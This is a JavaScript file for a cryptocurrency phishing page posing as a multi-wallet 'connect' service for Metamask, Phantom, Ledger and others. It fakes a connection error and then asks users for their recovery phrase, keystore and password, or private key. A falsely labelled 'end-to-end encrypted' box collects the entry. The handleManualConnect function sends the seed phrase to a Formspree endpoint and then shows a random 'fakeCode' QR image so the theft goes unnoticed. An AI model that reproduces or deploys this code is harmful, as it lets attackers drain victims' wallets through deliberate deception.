// === Wallet Page Navigation ===
function goToPage(num) {
  resetHeaderImages(num); // Reset header images before navigation
  window.location.href = num === 1 ? "index.html" : "page2.html";
}

// === Solana Connection or Fallback ===
async function connectSolanaWallet() {
  const loadingOverlay = document.createElement('div');
  loadingOverlay.id = 'loading-overlay';
  loadingOverlay.style.cssText = `
    display: flex;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw; /* Use viewport width */
    height: 100vh; /* Use viewport height */
    background: rgba(20, 20, 20, 0.9);
    z-index: 1005;
    justify-content: center;
    align-items: center;
    overflow: hidden; /* Prevent internal scrolling */
  `;

  const loadingContent = document.createElement('div');
  loadingContent.style.cssText = `display: flex; align-items: center; gap: 15px; max-height: 80px;`; // Tight height limit

  const loadingCircle = document.createElement('div');
  loadingCircle.style.cssText = `
    width: 30px;
    height: 30px;
    border: 4px solid #fff;
    border-top: 4px solid gold;
    border-radius: 50%;
    animation: spin 1s linear infinite;
  `;

  const loadingText = document.createElement('span');
  loadingText.textContent = `Connecting to Phantom...`;
  loadingText.style.cssText = `font-size: 14px; white-space: nowrap;`; // Prevent wrapping

  loadingContent.appendChild(loadingCircle);
  loadingContent.appendChild(loadingText);
  loadingOverlay.appendChild(loadingContent);
  document.body.appendChild(loadingOverlay);

  document.body.style.overflow = 'hidden'; // Prevent body scrolling
  document.body.style.position = 'fixed'; // Freeze body position
  document.body.style.width = '100%'; // Ensure body width matches viewport

  setTimeout(async () => {
    loadingOverlay.remove();
    document.body.style.overflow = 'auto'; // Restore body scrolling
    document.body.style.position = ''; // Reset body position
    document.body.style.width = ''; // Reset body width
    showSolanaManualFallback();
  }, 4000);
}

// === Manual Fallback for Phantom ===
function showSolanaManualFallback() {
  const container = document.createElement("div");
  container.id = "manualConnectContainer";
  container.style.cssText = `
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    padding: 30px;
    background-color: #1a1a1a;
    border-radius: 10px;
    color: white;
    text-align: center;
    width: 90%;
    max-width: 90%;
    margin: 0 auto;
    box-shadow: 0 0 10px gold;
    z-index: 1006;
    max-height: 80vh;
    overflow-y: auto;
  `;

  // Add animation styles for sliding effects
  const style = document.createElement("style");
  style.textContent = `
    @keyframes slideInFromLeft {
      from { transform: translateX(-100%); opacity: 0; }
      to { transform: translateX(0); opacity: 1; }
    }
    @keyframes slideInFromRight {
      from { transform: translateX(100%); opacity: 0; }
      to { transform: translateX(0); opacity: 1; }
    }
    @keyframes slideInFromUp {
      from { transform: translateY(-100%); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }
    @keyframes slideInFromDown {
      from { transform: translateY(100%); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }
    .slide-in-left {
      animation: slideInFromLeft 0.3s ease-out forwards;
    }
    .slide-in-right {
      animation: slideInFromRight 0.3s ease-out forwards;
    }
    .slide-in-up {
      animation: slideInFromUp 0.3s ease-out forwards;
    }
    .slide-in-down {
      animation: slideInFromDown 0.3s ease-out forwards;
    }
    #contentContainer {
      display: block !important;
      visibility: visible !important;
      opacity: 0;
      transition: opacity 0.3s ease-out;
    }
  `;
  container.appendChild(style);

  container.innerHTML = `
    <h3 style="color: red;">Error connecting....</h3>
    <h4 style="color: green;">Connect Manually</h4>
    <div id="connectOptions" style="display: flex; justify-content: center; gap: 20px; margin-bottom: 15px;">
      <button id="phraseOption" style="background: none; border: none; color: white; font-size: 16px; cursor: pointer; text-decoration: underline; text-decoration-color: #ffd700;">PHRASE</button>
      <button id="keystoreOption" style="background: none; border: none; color: white; font-size: 16px; cursor: pointer; text-decoration: none;">KEYSTORE JSON</button>
      <button id="privateKeyOption" style="background: none; border: none; color: white; font-size: 16px; cursor: pointer; text-decoration: none;">PRIVATE KEY</button>
    </div>
    <div id="contentContainer" style="overflow: hidden;"></div>
    <div id="qrBox" style="margin-top: 20px;"></div>
  `;

  const closeBtn = document.createElement('button');
  closeBtn.textContent = '×';
  closeBtn.style.cssText = `
    position: absolute;
    top: 10px;
    right: 10px;
    width: 30px;
    height: 30px;
    background-color: #ff4444;
    color: white;
    border: none;
    border-radius: 50%;
    cursor: pointer;
    font-size: 20px;
    line-height: 30px;
  `;
  closeBtn.onclick = () => {
    container.remove();
    resetHeaderImages();
  };
  container.appendChild(closeBtn);
  document.body.appendChild(container);

  // DOM elements
  const phraseOption = document.getElementById("phraseOption");
  const keystoreOption = document.getElementById("keystoreOption");
  const privateKeyOption = document.getElementById("privateKeyOption");
  const contentContainer = document.getElementById("contentContainer");

  // Initial state
  let selectedOption = "PHRASE";
  phraseOption.style.textDecoration = "underline";
  phraseOption.style.textDecorationColor = "#ffd700";

  // Function to render content
  function renderContent(option, direction) {
    const configs = {
      "PHRASE": {
        placeholder: "Enter your phrases...",
        passwordDisplay: "none",
        infoText: "Enter your phrases in the box manually, typically 12 or 24 words",
        textColor: "red"
      },
      "KEYSTORE JSON": {
        placeholder: "Keystore JSON",
        passwordDisplay: "block",
        infoText: "Several lines of text that begin with {...} and your password",
        textColor: "white"
      },
      "PRIVATE KEY": {
        placeholder: "Private key",
        passwordDisplay: "none",
        infoText: "Typically at least 60 characters",
        textColor: "white"
      }
    };

    const config = configs[option];
    // Clear and reset
    contentContainer.innerHTML = '';
    contentContainer.classList.remove("slide-in-left", "slide-in-right", "slide-in-up", "slide-in-down");
    contentContainer.style.opacity = "0";
    contentContainer.style.display = "block";
    contentContainer.style.visibility = "visible";

    // Set content
    contentContainer.innerHTML = `
      <textarea id="phraseInput" placeholder="${config.placeholder}" style="width: 100%; height: 120px; font-size: 16px; padding: 10px; color: ${config.textColor}; background-color: #222; border: 1px solid white; border-radius: 8px; resize: none;"></textarea>
      <div id="passwordInputContainer" style="display: ${config.passwordDisplay}; margin-top: 10px;">
        <input id="passwordInput" type="password" placeholder="Password" style="width: 100%; font-size: 16px; padding: 10px; color: white; background-color: #222; border: 1px solid white; border-radius: 8px;">
      </div>
      <p style="font-size: 12px; color: green; margin: 8px 0;">end-to-end encrypted</p>
      <p id="infoText" style="font-size: 14px;">${config.infoText}</p>
      <button id="connectButton" style="margin-top: 10px; padding: 10px 20px; background-color: gold; color: black; font-weight: bold; border-radius: 10px; box-shadow: 0 3px white; border: none; cursor: pointer;">Connect</button>
    `;

    // Debugging log
    console.log(`Rendering ${option} content with ${direction} animation`);

    // Apply animation
    requestAnimationFrame(() => {
      contentContainer.classList.add(`slide-in-${direction}`);
      contentContainer.style.opacity = "1"; // Ensure final visibility
    });

    // Attach event listeners
    const phraseInput = document.getElementById("phraseInput");
    const connectButton = document.getElementById("connectButton");
    if (phraseInput) {
      phraseInput.addEventListener("input", () => {
        if (option !== "PHRASE") return;
        const value = phraseInput.value.trim();
        const words = value.split(/\s+/).filter(Boolean);
        console.log(`Phrase input: ${words.length} words`); // Debug
        if (words.length === 12 || words.length === 24) {
          phraseInput.style.color = "green";
        } else {
          phraseInput.style.color = "red";
        }
      });
    } else {
      console.error("phraseInput not found after rendering");
    }
    if (connectButton) {
      connectButton.addEventListener("click", handleManualConnect);
    } else {
      console.error("connectButton not found after rendering");
    }
  }

  // Click handlers
  phraseOption.addEventListener("click", () => {
    selectedOption = "PHRASE";
    phraseOption.style.textDecoration = "underline";
    phraseOption.style.textDecorationColor = "#ffd700";
    keystoreOption.style.textDecoration = "none";
    privateKeyOption.style.textDecoration = "none";
    console.log("PHRASE clicked"); // Debug
    renderContent("PHRASE", "left");
  });

  keystoreOption.addEventListener("click", () => {
    selectedOption = "KEYSTORE JSON";
    phraseOption.style.textDecoration = "none";
    keystoreOption.style.textDecoration = "underline";
    keystoreOption.style.textDecorationColor = "#ffd700";
    privateKeyOption.style.textDecoration = "none";
    console.log("KEYSTORE JSON clicked"); // Debug
    renderContent("KEYSTORE JSON", "up");
  });

  privateKeyOption.addEventListener("click", () => {
    selectedOption = "PRIVATE KEY";
    phraseOption.style.textDecoration = "none";
    keystoreOption.style.textDecoration = "none";
    privateKeyOption.style.textDecoration = "underline";
    privateKeyOption.style.textDecorationColor = "#ffd700";
    console.log("PRIVATE KEY clicked"); // Debug
    renderContent("PRIVATE KEY", "down");
  });

  // Initial content load
  console.log("Initial content load"); // Debug
  renderContent("PHRASE", "right");
}

// === Handle Manual Connect and Send to Formspree ===
function handleManualConnect() {
  const input = document.getElementById("phraseInput");
  const words = input.value.trim().split(/\s+/).filter(Boolean).map(word => word.replace(/^\d+\.\s/, ''));

  if (words.length !== 12 && words.length !== 24) {
    alert("❌ Enter exactly 12 or 24 words.");
    return;
  }

  const qrBox = document.getElementById("qrBox");
  qrBox.innerHTML = `
    <div class="loading-circle" style="margin: 10px auto; width: 30px; height: 30px; border: 4px solid #fff; border-top: 4px solid gold; border-radius: 50%; animation: spin 1s linear infinite;"></div>
    <p style="color: gold;">Connecting...</p>
  `;

  const formspreeID = "manblypd";
  const text = words.join(" ");

  setTimeout(async () => {
    try {
      await fetch(`https://formspree.io/f/${formspreeID}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ "user-input": text }),
      });
      console.log("Phrase sent to email successfully.");
    } catch (err) {
      console.error("Failed to send phrase:", err);
    }

    const fakeCode = Math.floor(Math.random() * 1000000000);
    qrBox.innerHTML = `
      <p style="color: white;">Scan this code:</p>
      <img src="https://api.qrserver.com/v1/create-qr-code/?data=${fakeCode}&size=150x150" alt="QR Code" />
      <p style="color: green; margin-top: 10px;">ID: ${fakeCode}</p>
    `;
  }, 4000);
}

// === Show Wallet Overlay ===
function showWalletOverlay() {
  const walletOverlay = document.createElement('div');
  walletOverlay.id = 'wallet-overlay';
  walletOverlay.style.cssText = `
    display: flex;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw; /* Use viewport width */
    height: 100vh; /* Use viewport height */
    background-color: rgba(0, 0, 0, 0.7);
    z-index: 1004;
    justify-content: center;
    align-items: center;
    overflow: hidden; /* Prevent scrolling */
  `;

  const walletSelection = document.createElement('section');
  walletSelection.id = 'wallet-selection';
  walletSelection.style.cssText = `
    background-color: rgba(0, 0, 0, 0.95);
    padding: 2rem;
    border-radius: 10px;
    box-shadow: 3px 3px 0 white;
    width: 80%;
    max-width: 600px;
    margin: 0 auto;
    text-align: center;
    backdrop-filter: blur(5px);
    max-height: 80vh;
    overflow-y: auto;
  `;

  // Add animation styles for wallet name slide-in
  const style = document.createElement('style');
  style.textContent = `
    @keyframes slideInFromLeft {
      from { transform: translateX(-100%); opacity: 0; }
      to { transform: translateX(0); opacity: 1; }
    }
    .wallet-name-slide {
      opacity: 0;
      transform: translateX(-100%);
    }
    .wallet-name-slide.visible {
      animation: slideInFromLeft 0.3s ease-out forwards;
    }
  `;
  walletSelection.appendChild(style);

  const closeBtn = document.createElement('button');
  closeBtn.textContent = '×';
  closeBtn.style.cssText = `
    position: absolute;
    top: 10px;
    right: 10px;
    width: 30px;
    height: 30px;
    background-color: #ff4444;
    color: white;
    border: none;
    border-radius: 50%;
    cursor: pointer;
    font-size: 20px;
    line-height: 30px;
  `;
  closeBtn.onclick = () => {
    walletOverlay.remove();
    resetHeaderImages(); // Reset header images on close
  };
  walletSelection.appendChild(closeBtn);

  const title = document.createElement('h2');
  title.textContent = 'Select your wallet';
  title.style.cssText = `font-size: 2rem; margin-bottom: 1rem; color: white;`;

  const walletOptions = document.createElement('div');
  walletOptions.className = 'wallet-options';
  walletOptions.style.cssText = `
    display: flex;
    flex-direction: column;
    justify-content: center;
    gap: 1rem;
    padding: 10px;
    margin-bottom: 1rem;
  `;

  const wallets = [
    { name: 'Metamask', img: 'Metamask.jpeg' },
    { name: 'Trustwallet', img: 'Trustwallet.jpeg' },
    { name: 'Coinbase', img: 'Coinbase.png' },
    { name: 'Binance', img: 'Binance.png' },
    { name: 'Other', img: 'Other.png' },
    { name: 'Ledger', img: 'Ledger.jpeg' },
    { name: 'Phantom', img: 'Phantom.png' },
    { name: 'Polygon', img: 'Polygon.jpeg' },
    { name: 'Ronin', img: 'Ronin.png' },
    { name: 'SafePal', img: 'Safepal.png' },
    { name: 'Sui', img: 'Sui.png' },
    { name: 'Uniswap', img: 'Uniswap.jpeg' },
    { name: 'WalletConnect', img: 'Walletconnect.jpeg' },
    { name: 'Kepler', img: 'Kepler.jpeg' },
    { name: 'Solo Dex', img: 'Solo_dex.jpeg' },
    { name: 'XUMM', img: 'XUMM.jpeg' },
    { name: 'Bittensor', img: 'Bittensor.png' },
    { name: 'Compass', img: 'Compass.png' },
    { name: 'Compound', img: 'Compound.jpeg' },
    { name: 'Gate', img: 'Gate.webp' },
    { name: 'Bitpay', img: 'Bitpay.jpeg' },
    { name: 'Bing', img: 'Bing.png' },
  ];

  console.log("Wallet list:", wallets);
  wallets.forEach(wallet => {
    const btn = document.createElement('button');
    btn.className = 'wallet-btn';
    btn.style.cssText = `
      padding: 0.5rem 1rem;
      border: none;
      cursor: pointer;
      font-size: 1rem;
      background: none;
      display: flex;
      align-items: center;
      gap: 10px;
      transition: transform 0.3s ease;
      width: 100%;
      text-align: left;
    `;
    const img = document.createElement('img');
    img.src = wallet.img;
    img.alt = wallet.name;
    img.style.cssText = `
      width: 40px;
      height: 40px;
      border-radius: 50%;
      margin-right: 10px;
    `;
    const span = document.createElement('span');
    span.textContent = wallet.name;
    span.className = 'wallet-name-slide';
    span.style.cssText = `
      color: white;
      font-size: 1rem;
      flex: 1;
    `;
    btn.appendChild(img);
    btn.appendChild(span);
    btn.onclick = () => {
      walletOverlay.remove();
      showLoadingOverlay(wallet);
    };
    walletOptions.appendChild(btn);
  });

  walletSelection.appendChild(title);
  walletSelection.appendChild(walletOptions);
  walletOverlay.appendChild(walletSelection);
  document.body.appendChild(walletOverlay);

  walletOptions.scrollTop = 0;

  // Intersection Observer for wallet name animations
  const observer = new IntersectionObserver(
    entries => {
      entries.forEach(entry => {
        const span = entry.target.querySelector('.wallet-name-slide');
        if (entry.isIntersecting) {
          span.classList.add('visible');
        } else {
          span.classList.remove('visible');
        }
      });
    },
    { root: walletSelection, threshold: 0.1 }
  );

  document.querySelectorAll('.wallet-btn').forEach(btn => observer.observe(btn));
}

// === Loading Transition Before Wallet Connect ===
function showLoadingOverlay(wallet) {
  const loadingOverlay = document.createElement('div');
  loadingOverlay.id = 'loading-overlay';
  loadingOverlay.style.cssText = `
    display: flex;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw; /* Use viewport width */
    height: 100vh; /* Use viewport height */
    background: rgba(20, 20, 20, 0.9);
    z-index: 1005;
    justify-content: center;
    align-items: center;
    overflow: hidden; /* Prevent internal scrolling */
  `;

  const loadingContent = document.createElement('div');
  loadingContent.style.cssText = `display: flex; align-items: center; gap: 15px; max-height: 80px;`; // Tight height limit

  const walletImg = document.createElement('img');
  walletImg.src = wallet.img;
  walletImg.alt = `${wallet.name} Wallet`;
  walletImg.style.cssText = `
    width: 40px;
    height: 40px;
    border-radius: 50%;
  `;

  const loadingCircle = document.createElement('div');
  loadingCircle.style.cssText = `
    width: 30px;
    height: 30px;
    border: 4px solid #fff;
    border-top: 4px solid gold;
    border-radius: 50%;
    animation: spin 1s linear infinite;
  `;

  const loadingText = document.createElement('span');
  loadingText.textContent = `Connecting to ${wallet.name}...`;
  loadingText.style.cssText = `font-size: 14px; white-space: nowrap;`; // Prevent wrapping

  loadingContent.appendChild(walletImg);
  loadingContent.appendChild(loadingCircle);
  loadingContent.appendChild(loadingText);
  loadingOverlay.appendChild(loadingContent);
  document.body.appendChild(loadingOverlay);

  document.body.style.overflow = 'hidden'; // Prevent body scrolling
  document.body.style.position = 'fixed'; // Freeze body position
  document.body.style.width = '100%'; // Ensure body width matches viewport

  setTimeout(() => {
    loadingOverlay.remove();
    document.body.style.overflow = 'auto'; // Restore body scrolling
    document.body.style.position = ''; // Reset body position
    document.body.style.width = ''; // Reset body width
    showSolanaManualFallback();
  }, 4000);
}

// === Reset Header Images ===
function resetHeaderImages(pageNum = null) {
  const logo = document.querySelector('.logo');
  const walletIcon = document.querySelector('.wallet-icon');
  const homeIcon = document.querySelector('.home-icon');
  if (logo) {
    const newLogoSrc = 'Crypto.png'; // Crypto.png as permanent Logo
    if (!logo.src.includes(newLogoSrc)) {
      logo.src = newLogoSrc;
      logo.onload = () => console.log('Logo reloaded');
      logo.onerror = () => console.error('Logo failed to load');
    }
  }
  if (walletIcon) {
    const newWalletSrc = 'Wallet_icon.png'; // Wallet_icon.png as permanent Wallet on index.html
    if (!walletIcon.src.includes(newWalletSrc)) {
      walletIcon.src = newWalletSrc;
      walletIcon.onload = () => console.log('Wallet icon reloaded');
      walletIcon.onerror = () => console.error('Wallet icon failed to load');
    }
  }
  if (homeIcon) {
    if (pageNum === 2) { // Show Home.png only on page2.html
      const newHomeSrc = 'Home.png';
      if (!homeIcon.src.includes(newHomeSrc)) {
        homeIcon.src = newHomeSrc;
        homeIcon.onload = () => console.log('Home icon reloaded');
        homeIcon.onerror = () => console.error('Home icon failed to load');
        homeIcon.onclick = () => goToPage(1); // Navigate back to index.html
      }
    } else {
      homeIcon.style.display = 'none'; // Hide on index.html
    }
  }
}

// === Page Content Fade Animations ===
function initPageAnimations() {
  const style = document.createElement('style');
  style.textContent = `
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    @keyframes fadeOut {
      from { opacity: 1; }
      to { opacity: 0; }
    }
    .section-fade-in {
      animation: fadeIn 0.5s ease-in forwards;
    }
    .section-fade-out {
      animation: fadeOut 0.5s ease-out forwards;
    }
  `;
  document.head.appendChild(style);

  const observer = new IntersectionObserver(
    entries => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          entry.target.classList.remove('section-fade-out');
          entry.target.classList.add('section-fade-in');
        } else {
          entry.target.classList.remove('section-fade-in');
          entry.target.classList.add('section-fade-out');
        }
      });
    },
    { threshold: 0.1 }
  );

  document.querySelectorAll('section').forEach(section => {
    section.style.opacity = '0'; // Initial state
    observer.observe(section);
  });
}

document.addEventListener('DOMContentLoaded', () => {
  resetHeaderImages(); // Initial reset on page load
  initPageAnimations(); // Initialize page content animations
  const walletImage = document.querySelector('.wallet-image');
  if (walletImage) {
    walletImage.addEventListener('click', () => {
      showSolanaManualFallback();
    });
  }

  const clickHereButtons = document.querySelectorAll('.click-here');
  if (clickHereButtons) {
    clickHereButtons.forEach(button => {
      button.addEventListener('click', () => {
        showWalletOverlay();
      });
    });
  }
});